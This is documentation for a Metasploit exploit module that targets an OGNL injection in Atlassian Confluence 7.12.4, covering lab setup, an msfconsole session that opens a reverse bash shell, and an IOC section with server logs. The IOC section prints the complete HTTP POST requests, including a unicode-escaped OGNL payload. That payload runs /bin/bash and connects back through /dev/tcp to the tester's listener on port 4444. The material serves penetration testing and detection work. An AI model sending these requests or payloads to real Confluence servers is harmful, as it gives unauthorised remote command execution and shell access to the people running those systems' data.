## Vulnerable Application

### Description

This module exploits an OGNL injection in Atlassian Confluence's
WebWork component to execute commands as the Tomcat user.

### Setup

Run the following [Docker] command to test Confluence **7.12.4**:

`docker run -dp 8090:8090 atlassian/confluence:7.12.4`

You will need to [complete setup] once the container has started.

[Docker]: https://hub.docker.com/r/atlassian/confluence
[complete setup]: https://confluence.atlassian.com/doc/confluence-setup-guide-135691.html

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Scenarios

### Confluence 7.12.4 in [Docker]

```
msf6 > use exploit/linux/http/atlassian_confluence_webwork_ognl_injection
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/http/atlassian_confluence_webwork_ognl_injection) > options

Module options (exploit/linux/http/atlassian_confluence_webwork_ognl_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      8090             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Unix Command


msf6 exploit(linux/http/atlassian_confluence_webwork_ognl_injection) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 exploit(linux/http/atlassian_confluence_webwork_ognl_injection) > set lhost 172.16.57.1
lhost => 172.16.57.1
msf6 exploit(linux/http/atlassian_confluence_webwork_ognl_injection) > run

[*] Started reverse TCP handler on 172.16.57.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Successfully tested OGNL injection.
[*] Executing cmd/unix/reverse_bash (Unix Command)
[*] Command shell session 1 opened (172.16.57.1:4444 -> 172.16.57.1:56051) at 2021-09-08 07:54:45 -0500

id
uid=2002(confluence) gid=2002(confluence) groups=2002(confluence)
uname -a
Linux a92a48843438 5.10.25-linuxkit #1 SMP Tue Mar 23 09:27:39 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

## IOCs

```
POST /pages/createpage-entervariables.action HTTP/1.1
Host: 127.0.0.1:8090
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Type: application/x-www-form-urlencoded
Content-Length: 234

queryString=\u0031\u0071\u0075\u004b\u006d\u0048\u0042\u005a\u0027\u002b\u0027\u006b\u0054\u0077\u0068\u0041\u0074\u0073\u004a\u0027\u002b\u0027\u0055\u0079\u0076\u004e\u0058\u0062\u004f\u0058\u0058\u0066\u0074\u0037\u006e\u004d\u0050
```

```
POST /pages/createpage-entervariables.action HTTP/1.1
Host: 127.0.0.1:8090
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Type: application/x-www-form-urlencoded
Content-Length: 1782

queryString=\u0027\u002b\u0043\u006c\u0061\u0073\u0073\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0022\u006a\u0061\u0076\u0061\u0078\u002e\u0073\u0063\u0072\u0069\u0070\u0074\u002e\u0053\u0063\u0072\u0069\u0070\u0074\u0045\u006e\u0067\u0069\u006e\u0065\u004d\u0061\u006e\u0061\u0067\u0065\u0072\u0022\u0029\u002e\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u0028\u0029\u002e\u0067\u0065\u0074\u0045\u006e\u0067\u0069\u006e\u0065\u0042\u0079\u004e\u0061\u006d\u0065\u0028\u0022\u006a\u0073\u0022\u0029\u002e\u0065\u0076\u0061\u006c\u0028\u0027\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0042\u0075\u0069\u006c\u0064\u0065\u0072\u0028\u0022\u002f\u0062\u0069\u006e\u002f\u0062\u0061\u0073\u0068\u0022\u002c\u0022\u002d\u0063\u0022\u002c\u006e\u0065\u0077\u0020\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0053\u0074\u0072\u0069\u006e\u0067\u0028\u006a\u0061\u0076\u0061\u002e\u0075\u0074\u0069\u006c\u002e\u0042\u0061\u0073\u0065\u0036\u0034\u002e\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072\u0028\u0029\u002e\u0064\u0065\u0063\u006f\u0064\u0065\u0028\u0022\u004d\u0044\u0077\u006d\u004e\u0054\u006b\u0074\u004f\u0032\u0056\u0034\u005a\u0057\u004d\u0067\u004e\u0054\u006b\u0038\u0050\u0069\u0039\u006b\u005a\u0058\u0059\u0076\u0064\u0047\u004e\u0077\u004c\u007a\u0045\u0033\u004d\u0069\u0034\u0078\u004e\u0069\u0034\u0031\u004e\u0079\u0034\u0078\u004c\u007a\u0051\u0030\u004e\u0044\u0051\u0037\u0063\u0032\u0067\u0067\u0050\u0043\u0059\u0031\u004f\u0053\u0041\u002b\u004a\u006a\u0055\u0035\u0049\u0044\u0049\u002b\u004a\u006a\u0055\u0035\u0022\u0029\u0029\u0029\u002e\u0073\u0074\u0061\u0072\u0074\u0028\u0029\u0027\u0029\u002b\u0027
```

```
==> /var/atlassian/application-data/confluence/analytics-logs/e8b49a07d45fda45c7a7945b897c6efb.atlassian-analytics.log <==
1.8|2021-09-08 13:17:13,269|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|1618971593|confluence.shared-drafts.draftCreated|{}|1631107033269|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|analytics||
1.8|2021-09-08 13:17:13,296|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|1618971593|velocity16.web.panel.render.time|{"atlassianPlugin":true,"templateName":1438140996,"analyticEventVersion":1,"pluginKeyResponsible":424488225,"renderTimeMilliseconds":0,"renderExceptionThrown":false}|1631107033296|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|templaterenderer.velocity.one.six.internal||
1.8|2021-09-08 13:17:13,297|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|1618971593|velocity16.web.panel.render.time|{"atlassianPlugin":true,"templateName":1841481137,"analyticEventVersion":1,"pluginKeyResponsible":602150503,"renderTimeMilliseconds":0,"renderExceptionThrown":false}|1631107033297|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|templaterenderer.velocity.one.six.internal||
1.8|2021-09-08 13:17:13,321|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|1618971593|soy.web.panel.render.time|{"atlassianPlugin":true,"renderTimeMilliseconds":0,"webPanel":4219233039,"analyticEventVersion":1,"pluginKeyResponsible":602150503}|1631107033321|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|soy.impl.webpanel||
1.8|2021-09-08 13:17:13,324|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|1618971593|confluence.web.panel.render.time|{"atlassianPlugin":true,"renderTimeMilliseconds":26,"webPanelLocation":"templates/atlassian-editor.vm","analyticEventVersion":1,"pluginKeyResponsible":433867481}|1631107033324|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,330|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|1618971593|confluence.web.panel.render.time|{"atlassianPlugin":true,"renderTimeMilliseconds":0,"webPanelLocation":"/template/synchrony-token.vm","analyticEventVersion":1,"pluginKeyResponsible":2608662105}|1631107033330|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,332|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|1618971593|confluence.web.panel.render.time|{"atlassianPlugin":true,"renderTimeMilliseconds":0,"webPanelLocation":"/templates/editor-settings.vm","analyticEventVersion":1,"pluginKeyResponsible":602150503}|1631107033332|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,351|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|1618971593|confluence.web.panel.render.time|{"atlassianPlugin":true,"renderTimeMilliseconds":0,"webPanelLocation":"templates/date-header.vm","analyticEventVersion":1,"pluginKeyResponsible":3497139435}|1631107033351|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,395|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|1618971593|confluence.web.panel.render.time|{"atlassianPlugin":false,"renderTimeMilliseconds":2,"webPanelLocation":"#menuMacros_renderAuiHelpMenu()","analyticEventVersion":1,"pluginKeyResponsible":2332905261}|1631107033395|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,398|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|1618971593|confluence.web.panel.render.time|{"atlassianPlugin":false,"renderTimeMilliseconds":1,"webPanelLocation":"#menuMacros_renderAuiAdminMenu()","analyticEventVersion":1,"pluginKeyResponsible":2332905261}|1631107033398|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,404|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|1618971593|confluence.web.panel.render.time|{"atlassianPlugin":false,"renderTimeMilliseconds":1,"webPanelLocation":"#menuMacros_renderHeaderWorkDayLink()","analyticEventVersion":1,"pluginKeyResponsible":2332905261}|1631107033404|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,412|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|1618971593|confluence.web.panel.render.time|{"atlassianPlugin":false,"renderTimeMilliseconds":3,"webPanelLocation":"#menuMacros_renderAuiUserMenu()","analyticEventVersion":1,"pluginKeyResponsible":2332905261}|1631107033412|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,421|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|1618971593|soy.web.panel.render.time|{"atlassianPlugin":true,"renderTimeMilliseconds":0,"webPanel":311965510,"analyticEventVersion":1,"pluginKeyResponsible":2354996824}|1631107033421|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|soy.impl.webpanel||
1.8|2021-09-08 13:17:13,423|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|1618971593|confluence.web.panel.render.time|{"atlassianPlugin":false,"renderTimeMilliseconds":0,"webPanelLocation":"/decorators/includes/footer.vm","analyticEventVersion":1,"pluginKeyResponsible":2332905261}|1631107033423|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,429|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b||confluence.decorator.metrics|{"decorator.root.elapsedMillis":51,"decorator.main.invocationCount":1,"decorator.page.invocationCount":1,"decorator.main.elapsedMillis":86,"decorator.root.invocationCount":1,"decorator.page.elapsedMillis":3,"decoratorNames":""}|1631107033429|[redacted]||impl.profiling||
1.8|2021-09-08 13:17:13,431|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b||confluence.http.request.stats|{"requestUserTime":80,"reqTime":169,"timingEventKeys":"","url":"","requestGCDuration":0,"dbReqFinishTimes":"","reqStartTime":1631107033256,"requestCorrelationId":"","requestCpuTime":111,"requestGCCount":0,"dbReqTimesInMicros":"","key":"confluence.page.create.view","timingEventMillis":"77,78,78,78,78,78,78,78,79,81,83,85,106,130,132,134,159,159,163,167,167,169"}|1631107033431|[redacted]||analytics||
1.8|2021-09-08 13:17:13,462|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|724807884|confluence.shared-drafts.draftCreated|{}|1631107033462|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|analytics||
1.8|2021-09-08 13:17:13,579|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|724807884|velocity16.web.panel.render.time|{"atlassianPlugin":true,"templateName":1438140996,"analyticEventVersion":1,"pluginKeyResponsible":424488225,"renderTimeMilliseconds":0,"renderExceptionThrown":false}|1631107033579|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|templaterenderer.velocity.one.six.internal||
1.8|2021-09-08 13:17:13,580|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|724807884|velocity16.web.panel.render.time|{"atlassianPlugin":true,"templateName":1841481137,"analyticEventVersion":1,"pluginKeyResponsible":602150503,"renderTimeMilliseconds":0,"renderExceptionThrown":false}|1631107033580|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|templaterenderer.velocity.one.six.internal||
1.8|2021-09-08 13:17:13,607|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|724807884|soy.web.panel.render.time|{"atlassianPlugin":true,"renderTimeMilliseconds":0,"webPanel":4219233039,"analyticEventVersion":1,"pluginKeyResponsible":602150503}|1631107033607|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|soy.impl.webpanel||
1.8|2021-09-08 13:17:13,623|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|724807884|confluence.web.panel.render.time|{"atlassianPlugin":true,"renderTimeMilliseconds":41,"webPanelLocation":"templates/atlassian-editor.vm","analyticEventVersion":1,"pluginKeyResponsible":433867481}|1631107033623|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,643|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|724807884|confluence.web.panel.render.time|{"atlassianPlugin":true,"renderTimeMilliseconds":3,"webPanelLocation":"/template/synchrony-token.vm","analyticEventVersion":1,"pluginKeyResponsible":2608662105}|1631107033643|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,645|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|724807884|confluence.web.panel.render.time|{"atlassianPlugin":true,"renderTimeMilliseconds":0,"webPanelLocation":"/templates/editor-settings.vm","analyticEventVersion":1,"pluginKeyResponsible":602150503}|1631107033645|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,667|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|724807884|confluence.web.panel.render.time|{"atlassianPlugin":true,"renderTimeMilliseconds":0,"webPanelLocation":"templates/date-header.vm","analyticEventVersion":1,"pluginKeyResponsible":3497139435}|1631107033667|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,697|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|724807884|confluence.web.panel.render.time|{"atlassianPlugin":false,"renderTimeMilliseconds":2,"webPanelLocation":"#menuMacros_renderAuiHelpMenu()","analyticEventVersion":1,"pluginKeyResponsible":2332905261}|1631107033697|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,698|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|724807884|confluence.web.panel.render.time|{"atlassianPlugin":false,"renderTimeMilliseconds":0,"webPanelLocation":"#menuMacros_renderAuiAdminMenu()","analyticEventVersion":1,"pluginKeyResponsible":2332905261}|1631107033698|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,699|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|724807884|confluence.web.panel.render.time|{"atlassianPlugin":false,"renderTimeMilliseconds":0,"webPanelLocation":"#menuMacros_renderHeaderWorkDayLink()","analyticEventVersion":1,"pluginKeyResponsible":2332905261}|1631107033699|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,701|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|724807884|confluence.web.panel.render.time|{"atlassianPlugin":false,"renderTimeMilliseconds":1,"webPanelLocation":"#menuMacros_renderAuiUserMenu()","analyticEventVersion":1,"pluginKeyResponsible":2332905261}|1631107033701|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,707|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|724807884|soy.web.panel.render.time|{"atlassianPlugin":true,"renderTimeMilliseconds":0,"webPanel":311965510,"analyticEventVersion":1,"pluginKeyResponsible":2354996824}|1631107033707|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|soy.impl.webpanel||
1.8|2021-09-08 13:17:13,709|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b|724807884|confluence.web.panel.render.time|{"atlassianPlugin":false,"renderTimeMilliseconds":0,"webPanelLocation":"/decorators/includes/footer.vm","analyticEventVersion":1,"pluginKeyResponsible":2332905261}|1631107033709|[redacted]|9895d158ce2b36b007b9eb4734b9ad13|||
1.8|2021-09-08 13:17:13,713|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b||confluence.decorator.metrics|{"decorator.root.elapsedMillis":181,"decorator.main.invocationCount":1,"decorator.page.invocationCount":1,"decorator.main.elapsedMillis":51,"decorator.root.invocationCount":1,"decorator.page.elapsedMillis":6,"decoratorNames":""}|1631107033713|[redacted]||impl.profiling||
1.8|2021-09-08 13:17:13,715|6c02c4e7e81604d7992b7468693203c5|confluence|7.12.4|42780a27d778f578850e6a8af52b483b||confluence.http.request.stats|{"requestUserTime":130,"reqTime":254,"timingEventKeys":"","url":"","requestGCDuration":0,"dbReqFinishTimes":"","reqStartTime":1631107033456,"requestCorrelationId":"","requestCpuTime":191,"requestGCCount":0,"dbReqTimesInMicros":"","key":"confluence.page.create.view","timingEventMillis":"194,195,195,195,195,195,195,196,198,200,203,204,212,234,236,237,247,247,250,253,253,254"}|1631107033715|[redacted]||analytics||

==> /var/atlassian/application-data/confluence/logs/atlassian-confluence.log <==
2021-09-08 13:17:13,327 ERROR [http-nio-8090-exec-7] [confluence.plugins.synchrony.SynchronyContextProvider] getContextMap
 -- url: /pages/createpage-entervariables.action | traceId: 4856457e33eee6dd | userName: anonymous | action: createpage-entervariables
2021-09-08 13:17:13,638 ERROR [http-nio-8090-exec-6] [confluence.plugins.synchrony.SynchronyContextProvider] getContextMap
 -- url: /pages/createpage-entervariables.action | traceId: 24b3de19b550e873 | userName: anonymous | action: createpage-entervariables
```
